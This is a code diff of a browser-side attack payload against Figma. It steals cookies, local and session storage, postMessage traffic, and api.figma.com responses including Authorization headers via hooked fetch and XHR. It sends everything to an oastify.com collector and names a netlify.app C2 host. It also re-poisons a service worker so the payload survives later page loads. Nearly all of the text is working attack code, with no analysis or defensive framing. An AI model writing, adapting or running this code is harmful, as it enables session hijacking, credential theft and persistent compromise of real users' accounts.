@@ -1,50 +1,65 @@
-(function () {
+  (function () {
     const C2 = 'https://gleeful-creponne-8ff162.netlify.app';
-    const OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com'; // your oastify
+    const OOB = 'https://ua8bgofxi61ugvubb5h68nigu70yopce.oastify.com';
 
     function exfil(tag, data) {
-      const payload = typeof data === 'string' ? data : JSON.stringify(data);
-      // sendBeacon no-cors — no CORS needed for exfil
-      navigator.sendBeacon(OOB + '/p?t=' + tag, payload);
-      // img fallback
-      new Image().src = OOB + '/i?t=' + tag + '&d=' + encodeURIComponent(payload).slice(0, 1800);
+      navigator.sendBeacon(OOB + '/p?t=' + tag, JSON.stringify(data));
     }
 
-    // 1. Dump context
-    exfil('ctx', {
+    // === STEP 1 CONFIRM: this fires on load ===
+    exfil('loaded', {
       origin: location.origin,
       href: location.href,
       cookie: document.cookie,
-      ls: JSON.stringify(Object.fromEntries(
-        Object.keys(localStorage).map(k => [k, localStorage.getItem(k)])
-      )),
-      ss: JSON.stringify(Object.fromEntries(
-        Object.keys(sessionStorage).map(k => [k, sessionStorage.getItem(k)])
-      ))
+      ls: JSON.stringify(Object.fromEntries(Object.keys(localStorage).map(k => [k, localStorage.getItem(k)]))),
+      ss: JSON.stringify(Object.fromEntries(Object.keys(sessionStorage).map(k => [k, sessionStorage.getItem(k)])))
     });
 
-    // 2. Listen for ALL postMessages flowing through the iframe
-    // (figma.com → iframe traffic you already know about)
+    // === postMessage sniffer ===
     window.addEventListener('message', e => {
-      exfil('pm', {
-        from: e.origin,
-        data: typeof e.data === 'string' ? e.data : JSON.stringify(e.data)
+      exfil('pm', { from: e.origin, data: typeof e.data === 'string' ? e.data : JSON.stringify(e.data) });
+    }, true);
+
+    // === Fetch hook — captures api.figma.com responses ===
+    const _fetch = window.fetch.bind(window);
+    window.fetch = async function(input, init) {
+      const response = await _fetch(input, init);
+      const url = typeof input === 'string' ? input : input.url;
+      if (url.includes('api.figma.com') || url.includes('figma.com/api')) {
+        try {
+          const clone = response.clone();
+          const body = await clone.text();
+          const reqAuth = (init && init.headers)
+            ? (init.headers['Authorization'] || init.headers['authorization'] || '')
+            : '';
+          exfil('api', { url, method: (init && init.method) || 'GET', auth: reqAuth, status: response.status, body:
+  body.slice(0, 4000) });
+        } catch(e) {}
+      }
+      return response;
+    };
+
+    // === XHR hook ===
+    const _open = XMLHttpRequest.prototype.open;
+    const _send = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.open = function(method, url, ...args) {
+      this._url = url; this._method = method;
+      return _open.apply(this, [method, url, ...args]);
+    };
+    XMLHttpRequest.prototype.send = function(body) {
+      this.addEventListener('load', function() {
+        if (this._url && (this._url.includes('api.figma.com') || this._url.includes('figma.com/api'))) {
+          exfil('xhr', { url: this._url, method: this._method, status: this.status, body: this.responseText.slice(0,4000) });
+        }
       });
-    }, true); // capture phase — catches everything
+      return _send.apply(this, arguments);
+    };
 
-    // 3. Fire your known working postMessage vectors at figma.com
-    // Replace with whatever payload you've already confirmed works
-    if (window.top !== window) {
-      window.top.postMessage('__figma_probe__', 'https://www.figma.com');
-      window.parent.postMessage('__figma_probe__', 'https://www.figma.com');
-    }
-
-    // 4. Re-poison the SW so next page load still gets our payload
-    // (self-perpetuating — survives until user clears SW cache manually)
+    // === Re-poison SW on next update-asset-url-map ===
     if (navigator.serviceWorker && navigator.serviceWorker.controller) {
       const ctrl = navigator.serviceWorker.controller;
       const orig = ctrl.postMessage.bind(ctrl);
-      ctrl.postMessage = function (msg) {
+      ctrl.postMessage = function(msg) {
         if (msg && msg.type === 'update-asset-url-map' && msg.assets) {
           const poisoned = { ...msg.assets };
           for (const k of Object.keys(poisoned)) {
@@ -54,6 +69,7 @@
         }
         return orig(msg);
       };
-      exfil('sw_repoisoned', { ok: true });
+      exfil('sw_hooked', { scope: navigator.serviceWorker.controller.scriptURL });
     }
+
   })();
